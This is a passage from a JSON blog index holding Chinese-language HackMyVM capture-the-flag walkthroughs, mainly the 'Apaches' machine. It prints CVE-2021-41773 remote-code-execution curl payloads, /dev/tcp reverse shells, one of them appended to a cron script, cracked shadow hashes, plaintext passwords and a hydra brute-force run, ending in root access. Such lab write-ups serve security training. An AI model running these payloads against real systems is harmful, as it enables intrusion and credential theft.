\n```\n\n\u53d1\u5e7f\u64ad\u770b\u770b\u8c01\u5728\u7ebf\uff0c\u7136\u540e\u4e00\u4e2a\u4e2a\u8bd5\u5c31\u597d\u4e86\uff08\u6865\u63a5\u771f\u5b9e\u7f51\u5361\u522b\u8fd9\u4e48\u8fde\uff0c\u5efa\u8bae\u628a\u6865\u63a5\u6362\u6210NAT\u6a21\u5f0f\u518d\u5c1d\u8bd5\uff09\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh -i id_rsa root@fe80::a00:27ff:fead:e1d7%eth0\nLinux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nroot@airbind:~# id\nuid=0(root) gid=0(root) groupes=0(root)\n```sentence", "top": 0, "createdAt": 1751016746, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P89": {"htmlDir": "docs/post/hmv_Apaches.html", "labels": ["HackMyVM"], "postTitle": "hmv_Apaches", "postUrl": "post/hmv_Apaches.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/89", "commentNum": 0, "wordCount": 17066, "description": "# hmv_Apaches\n\n# 0. \u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.143\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1. \u626b\u63cf\n\n\u9996\u5148\uff0c\u901a\u8fc7 `nmap` \u5bf9\u9776\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u68c0\u67e5\u5f00\u653e\u7aef\u53e3\u548c\u670d\u52a1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST\nNmap scan report for 192.168.205.143\nHost is up (0.00024s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n\u4ece\u626b\u63cf\u7ed3\u679c\u53ef\u4ee5\u770b\u5230\uff0c\u9776\u673a\u5f00\u542f\u4e86 **SSH** \u548c **HTTP** \u670d\u52a1\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5bf9 HTTP \u670d\u52a1\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6e17\u900f\u6d4b\u8bd5\u3002\n\n# 2. \u6f0f\u6d1e\u626b\u63cf\u4e0e\u5229\u7528\n\n\u901a\u8fc7\u8bbf\u95ee Web \u670d\u52a1\uff0c\u672a\u53d1\u73b0\u660e\u663e\u7684\u6f0f\u6d1e\u3002\u56e0\u6b64\uff0c\u6211\u4f7f\u7528 **feroxbuster** \u5bf9\u9776\u673a\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u867d\u7136\u672a\u83b7\u5f97\u6709\u6548\u7684\u76ee\u5f55\u5217\u8868\uff0c\u4f46\u7ee7\u7eed\u4f7f\u7528 `nuclei` \u5de5\u5177\u5bf9\u9776\u673a\u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf\uff0c\u6700\u7ec8\u53d1\u73b0\u4e86\u4e00\u4e2a\u9ad8\u5371\u6f0f\u6d1e\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nuclei -u 192.168.205.143\n...\n[INF] Running httpx on input host\n[INF] Found 1 URL from httpx\n...\n[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773):RCE] [http] [high] http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh\n...\n```\n\n\u8be5\u6f0f\u6d1e\u4e3a **[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773)**\uff0c\u662f Apache HTTP \u670d\u52a1\u5668\u7684\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff0c\u80fd\u591f\u901a\u8fc7\u8bbf\u95ee\u7279\u5b9a\u8def\u5f84\u6267\u884c\u547d\u4ee4\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; id'\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n```\n\n\u6267\u884c\u6210\u529f\u540e\uff0c\u83b7\u53d6\u4e86\u9776\u673a\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u8fdb\u4e00\u6b65\u786e\u8ba4\u6f0f\u6d1e\u6709\u6548\u3002\u73b0\u5728\u6211\u4eec\u6267\u884c\u53cd\u5f39shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type:text/plain; echo; bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1''\n\n#kali\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                                \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 60584\nbash: cannot set terminal process group (651): Inappropriate ioctl for device\nbash: no job control in this shell\ndaemon@apaches:/usr/bin$ id\nid\nuid=1(daemon) gid=1(daemon) groups=1(daemon)\n```\n\n# 3. \u83b7\u53d6\u7a33\u5b9a\u7684 Shell\n\n\u4e3a\u4e86\u83b7\u53d6\u4e00\u4e2a\u66f4\u52a0\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f shell\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n\u8fd9\u4e9b\u64cd\u4f5c\u786e\u4fdd\u4e86\u4e0e\u9776\u673a\u7684\u8fde\u63a5\u66f4\u4e3a\u7a33\u5b9a\uff0c\u5e76\u4e3a\u540e\u7eed\u7684\u6e17\u900f\u64cd\u4f5c\u63d0\u4f9b\u4e86\u826f\u597d\u7684\u57fa\u7840\u3002\n\n# 4.\u63d0\u6743\n\n```bash\ndaemon@apaches:/usr/bin$ cd /home/\ndaemon@apaches:/home$ ls -al\ntotal 24\ndrwxr-xr-x  6 root       root       4096 Oct  9  2022 .\ndrwxr-xr-x 20 root       root       4096 Sep 30  2022 ..\ndrwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo\ndrwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas\ndrwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea\ndrwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto\ndaemon@apaches:/home$ cd geronimo/\ndaemon@apaches:/home/geronimo$ ls -al\ntotal 32\ndrwxr-xr-x 4 geronimo geronimo 4096 Jul 13  2023 .\ndrwxr-xr-x 6 root     root     4096 Oct  9  2022 ..\n-rw------- 1 geronimo geronimo    0 Jul 13  2023 .bash_history\n-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc\ndrwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache\ndrwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local\n-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile\n-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful\n-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt\ndaemon@apaches:/home/geronimo$ cd ..\ndaemon@apaches:/home$ cd pocahontas/\ndaemon@apaches:/home/pocahontas$ ls -al\ntotal 36\ndrwxr-xr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .\ndrwxr-xr-x 6 root       root        4096 Oct  9  2022 ..\n-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history\n-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout\n-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc\ndrwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local\n-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile\n-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt\ndaemon@apaches:/home/pocahontas$ cd ..\ndaemon@apaches:/home$ cd sacagawea/\ndaemon@apaches:/home/sacagawea$ ls -la\ntotal 48\ndrwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 .\ndrwxr-xr-x 6 root      root      4096 Oct  9  2022 ..\n-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history\n-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout\n-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc\ndrwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local\n-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile\n-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor\ndrwxrwxr-x 2 sacagawea sacagawea 4096 Jan 22 06:06 Backup\ndrwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development\ndrwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts\n-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt\ndaemon@apaches:/home/sacagawea$ cd Backup/\ndaemon@apaches:/home/sacagawea/Backup$ ls -al\ntotal 23128\ndrwxrwxr-x 2 sacagawea sacagawea     4096 Jan 22 06:06 .\ndrwxr-xr-x 6 sacagawea sacagawea     4096 Jul 13  2023 ..\n-rwx------ 1 sacagawea sacagawea 23673389 Jan 22 06:06 Backup.tar.gz\ndaemon@apaches:/home/sacagawea/Backup$ cd ..\ndaemon@apaches:/home/sacagawea$ cd Development/\ndaemon@apaches:/home/sacagawea/Development$ ls -al\ntotal 68\ndrwxrwxr-x 7 sacagawea sacagawea  4096 Oct 10  2022 .\ndrwxr-xr-x 6 sacagawea sacagawea  4096 Jul 13  2023 ..\ndrwx------ 2 sacagawea sacagawea  4096 Oct  6  2022 admin\ndrwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 css\ndrwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 fonts\ndrwxrwxr-x 4 sacagawea sacagawea  4096 Oct 10  2022 images\n-rwxrwxr-x 1 sacagawea sacagawea 33940 Oct 10  2022 index.html\ndrwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 js\n-rwxrwxr-x 1 sacagawea sacagawea   116 Oct 10  2022 robots.txt\ndaemon@apaches:/home/sacagawea/Development$ cd ..\ndaemon@apaches:/home/sacagawea$ cd ..\ndaemon@apaches:/home$ ls -al\ntotal 24\ndrwxr-xr-x  6 root       root       4096 Oct  9  2022 .\ndrwxr-xr-x 20 root       root       4096 Sep 30  2022 ..\ndrwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo\ndrwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas\ndrwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea\ndrwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto\ndaemon@apaches:/home$ cd squanto/\ndaemon@apaches:/home/squanto$ ls -al\ntotal 36\ndrwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 .\ndrwxr-xr-x 6 root    root    4096 Oct  9  2022 ..\n-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history\n-rw-r--r-- 1 squanto squanto  220 Oct  9  2022 .bash_logout\n-rw-r--r-- 1 squanto squanto 3771 Oct  9  2022 .bashrc\ndrwxrwxr-x 3 squanto squanto 4096 Oct  9  2022 .local\n-rw-r--r-- 1 squanto squanto  807 Oct  9  2022 .profile\ndrwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup\n-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md\n-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt\ndaemon@apaches:/home/squanto$ cat backup/\ncat: backup/: Is a directory\ndaemon@apaches:/home/squanto$ cd backup/ \ndaemon@apaches:/home/squanto/backup$ ls -al\ntotal 8\ndrwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 .\ndrwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 ..\ndaemon@apaches:/home/squanto/backup$ c d..\nc: command not found\ndaemon@apaches:/home/squanto/backup$ cd ..\ndaemon@apaches:/home/squanto$ cat todo.md  \n### Development\n\n- [x] Apaches frontpage\n- [ ] Portal for administration\n- [ ] Database selection for administration\n- [ ] Hardening the system for attacks\ndaemon@apaches:/home/squanto$ cd /opt/ \ndaemon@apaches:/opt$ ls --la\nls: unrecognized option '--la'\nTry 'ls --help' for more information.\ndaemon@apaches:/opt$ ls -la\ntotal 8\ndrwxr-xr-x  2 root root 4096 Apr 23  2020 .\ndrwxr-xr-x 20 root root 4096 Sep 30  2022 ..\ndaemon@apaches:/opt$ cd /tmp/\ndaemon@apaches:/tmp$ ls -al\ntotal 44\ndrwxrwxrwt 11 root root 4096 Jan 22 06:04 .\ndrwxr-xr-x 20 root root 4096 Sep 30  2022 ..\ndrwxrwxrwt  2 root root 4096 Jan 22 05:58 .ICE-unix\ndrwxrwxrwt  2 root root 4096 Jan 22 05:58 .Test-unix\ndrwxrwxrwt  2 root root 4096 Jan 22 05:58 .X11-unix\ndrwxrwxrwt  2 root root 4096 Jan 22 05:58 .XIM-unix\ndrwxrwxrwt  2 root root 4096 Jan 22 05:58 .font-unix\ndrwx------  3 root root 4096 Jan 22 05:58 snap-private-tmp\ndrwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-logind.service-62l80f\ndrwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-resolved.service-U7wK0h\ndrwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-timesyncd.service-6HVyEh\n\ndaemon@apaches:/tmp$ wget 192.168.205.141/linpeas.sh\n--2025-01-22 06:10:32--  http://192.168.205.141/linpeas.sh\nConnecting to 192.168.205.141:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 824847 (806K) [text/x-sh]\nSaving to: 'linpeas.sh'\n\nlinpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================>] 805.51K  --.-KB/s    in 0.02s   \n\n2025-01-22 06:10:32 (49.1 MB/s) - 'linpeas.sh' saved [824847/824847]\n\ndaemon@apaches:/tmp$ chmod +x linpeas.sh \ndaemon@apaches:/tmp$ bash linpeas.sh \n\u2550\u2563 Can I read shadow files? ............. root:*:18375:0:99999:7:::                                                                \ndaemon:*:18375:0:99999:7:::\nbin:*:18375:0:99999:7:::\nsys:*:18375:0:99999:7:::\nsync:*:18375:0:99999:7:::\ngames:*:18375:0:99999:7:::\nman:*:18375:0:99999:7:::\nlp:*:18375:0:99999:7:::\nmail:*:18375:0:99999:7:::\nnews:*:18375:0:99999:7:::\nuucp:*:18375:0:99999:7:::\nproxy:*:18375:0:99999:7:::\nwww-data:*:18375:0:99999:7:::\nbackup:*:18375:0:99999:7:::\nlist:*:18375:0:99999:7:::\nirc:*:18375:0:99999:7:::\ngnats:*:18375:0:99999:7:::\nnobody:*:18375:0:99999:7:::\nsystemd-network:*:18375:0:99999:7:::\nsystemd-resolve:*:18375:0:99999:7:::\nsystemd-timesync:*:18375:0:99999:7:::\nmessagebus:*:18375:0:99999:7:::\nsyslog:*:18375:0:99999:7:::\n_apt:*:18375:0:99999:7:::\ntss:*:18375:0:99999:7:::\nuuidd:*:18375:0:99999:7:::\ntcpdump:*:18375:0:99999:7:::\nlandscape:*:18375:0:99999:7:::\npollinate:*:18375:0:99999:7:::\nsshd:*:19265:0:99999:7:::\nsystemd-coredump:!!:19265::::::\ngeronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::\nlxd:!:19265::::::\nsquanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::\nsacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::\npocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::                                                                                                                                  \n\u2550\u2563 Can I read shadow plists? ............ No\n\u2550\u2563 Can I write shadow plists? ........... No                                                                                       \n\u2550\u2563 Can I read opasswd file? ............. No                                                                                       \n\u2550\u2563 Can I write in network-scripts? ...... No                                                                                       \n\u2550\u2563 Can I read root folder? .............. No                   \n```\n\n\u6211\u53bb......\u6211\u662f\u6ca1\u60f3\u5230\u5b83`/etc/shadow`\u662f\u53ef\u8bfb\u7684\u3002\u6211\u4eec\u5c06\u6570\u636e\u63d0\u53d6\u51fa\u6765\u7206\u7834\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat hash\ngeronimo:$6$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::\nsquanto:$6$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::\nsacagawea:$6$7jhI/21/BZR5KyY6$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::\npocahontas:$6$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\niamtheone        (squanto)   \n1g 0:00:02:02 6.84% (ETA: 14:47:27) 0.008181g/s 9123p/s 27696c/s 27696C/s 14032519..1234victor\nUse the '--show' option to display all of the cracked passwords reliably\nSession aborted\n\n```\n\n\u6211\u4eec\u767b\u5f55\u4e0a\u53bb\uff0c\u7ee7\u7eed\u63d0\u6743\n\n```bash\nsquanto@apaches:/home/sacagawea$ id\nuid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)\nsquanto@apaches:/home/sacagawea$ find / -group Lipan 2>/dev/null\n/home/sacagawea/Scripts/backup.sh\nsquanto@apaches:/home/sacagawea$ cd /home/sacagawea/Scripts/\nsquanto@apaches:/home/sacagawea/Scripts$ ls -al\ntotal 12\ndrwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 .\ndrwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 ..\n-rwxrwx--- 1 sacagawea Lipan      182 Oct 10  2022 backup.sh\nsquanto@apaches:/home/sacagawea/Scripts$ cat backup.sh \n#!/bin/bash\n\nrm -rf /home/sacagawea/Backup/Backup.tar.gz\ntar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs\nchmod 700 /home/sacagawea/Backup/Backup.tar.gz\n```\n\n\u6709\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\uff0c\u770b\u7740\u5c31\u50cf\u5b9a\u65f6\u4efb\u52a1\uff0c\u800c\u4e14\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\uff0c\u6211\u4eec\u52a0\u4e2a\u53cd\u5f39shell\u4e0a\u53bb\n\n```bash\nsquanto@apaches:/home/sacagawea/Scripts$ echo 'bash -c 'bash -i >& /dev/tcp/192.168.205.141/8889 0>&1'' >> backup.sh \nsquanto@apaches:/home/sacagawea/Scripts$ cat backup.sh \n#!/bin/bash\n\nrm -rf /home/sacagawea/Backup/Backup.tar.gz\ntar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs\nchmod 700 /home/sacagawea/Backup/Backup.tar.gz\nbash -c 'bash -i >& /dev/tcp/192.168.205.141/8889 0>&1'\n```\n\n\u6211\u4eec\u7a0d\u7b49\u7247\u523b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8889                                \nlistening on [any] 8889 ...\nid\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 50796\nbash: cannot set terminal process group (48786): Inappropriate ioctl for device\nbash: no job control in this shell\nsacagawea@apaches:~$ id\nuid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)\n```\n\n\u7ee7\u7eed\u63d0\u6743\n\n```bash\nsacagawea@apaches:~$ cd Development/\nsacagawea@apaches:~/Development$ ls\nls\nadmin\ncss\nfonts\nimages\nindex.html\njs\nrobots.txt\nsacagawea@apaches:~/Development$ cd admin/\nsacagawea@apaches:~/Development/admin$ ls\nls\n1a-login.php\n1b-login.css\n2-check.php\n3-protect.php\nsacagawea@apaches:~/Development/admin$ cat 2-check.php \n<?php\n// (A) START SESSION\nsession_start();\n\n// (B) HANDLE LOGIN\nif (isset($_POST['user']) && !isset($_SESSION['user'])) {\n  // (B1) USERS & PASSWORDS - SET YOUR OWN !\n  $users = [\n    'geronimo' => '12u7D9@4IA9uBO4pX9#6jZ3456',\n    'pocahontas' => 'y2U1@8Ie&OHwd^Ww3uAl',\n    'squanto' => '4Rl3^K8WDG@sG24Hq@ih',\n    'sacagawea' => 'cU21X8&uGswgYsL!raXC'\n  ];\n\n  // (B2) CHECK & VERIFY\n  if (isset($users[$_POST['user']])) {\n    if ($users[$_POST['user']] == $_POST['password']) {\n      $_SESSION['user'] = $_POST['user'];\n    }\n  }\n\n  // (B3) FAILED LOGIN FLAG\n  if (!isset($_SESSION['user'])) { $failed = true; }\n}\n\n// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN\nif (isset($_SESSION['user'])) {\n  header('Location: index.php');\n  exit();\n}\n```\n\n\u53d1\u73b0\u4e86\u51e0\u7ec4\u7528\u6237\u548c\u5bc6\u7801\uff0c\u6211\u4eec\u5c1d\u8bd5\u5229\u7528\u5176\u7206\u7834ssh\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat user              \ngeronimo\npocahontas\nsquanto\nsacagawea\n                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat pass\n12u7D9@4IA9uBO4pX9#6jZ3456\ny2U1@8Ie&OHwd^Ww3uAl\n4Rl3^K8WDG@sG24Hq@ih\ncU21X8&uGswgYsL!raXC\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -L user -P pass ssh://192.168.205.143 -V -I -u -f -e nsr -t 64\n\n[22][ssh] host: 192.168.205.143   login: pocahontas   password: y2U1@8Ie&OHwd^Ww3uAl\n[STATUS] attack finished for 192.168.205.143 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 14:32:09\n\n```\n\n\u6211\u4eec\u901a\u8fc7ssh\u8fde\u63a5\u4e0a\u53bb\uff08\u5efa\u8bae\u8fd9\u6837\u8fde\u63a5\uff0c\u4e0d\u8981\u8981\u4e0a\u4e00\u4e2a\u7528\u6237\u5207\u7528\u6237\uff0c\u4e0d\u7136\u5b83sudo\u4f1a\u62a5\u9519\uff09\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh pocahontas@192.168.205.143\n\npocahontas@apaches:~$ sudo -l\nMatching Defaults entries for pocahontas on apaches:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser pocahontas may run the following commands on apaches:\n    (geronimo) /bin/nano\n```\n\n![Image](https://github.com/user-attachments/assets/ddc1fb60-c726-483a-a3eb-5afdd9bf9a3e)\n\n\u53ef\u4ee5\u4f7f\u7528**sudo nano**\uff0c\u6211\u4eec\u8fdb\u884c\u63d0\u6743\n\n```bash\npocahontas@apaches:~$ sudo -u geronimo /bin/nano\n$ bash\ngeronimo@apaches:/home/pocahontas$ sudo bash -p\nroot@apaches:/home/pocahontas# id\nuid=0(root) gid=0(root) groups=0(root)\n```sentence", "top": 0, "createdAt": 1751016750, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P90": {"htmlDir": "docs/post/hmv_aurora.html", "labels": ["HackMyVM"], "postTitle": "hmv_aurora", "postUrl": "post/hmv_aurora.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/90", "commentNum": 0, "wordCount": 18225, "description": "# hmv_aurora\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - aurora](https://hackmyvm.eu/machines/machine.php?vm=aurora)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.138\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 10:12 CST\nNmap scan report for 192.168.205.138\nHost is up (0.00044s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\nMAC Address: 08:00:27:68:BD:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.39 seconds\n```\n\n**3000**\u5927\u6982\u7387\u662f**web**\u9875\u9762\n\n# 2.\u8e29\u70b9\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/\n<!DOCTYPE html>\n<html lang='en'>\n<head>\n<meta charset='utf-8'>\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /</pre>\n</body>\n</html>\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138:3000/\n<!DOCTYPE html>\n<html lang='en'>\n<head>\n<meta charset='utf-8'>\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot GET /</pre>\n</body>\n</html>\n\n```\n\n\u7981\u6b62`GET`\u8bbf\u95ee\uff0c\u90a3\u6211\u4eec\u5c31`POST`\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u 'http://192.168.205.138:3000' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -m POST\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben 'epi' Risher \ud83e\udd13                 ver: 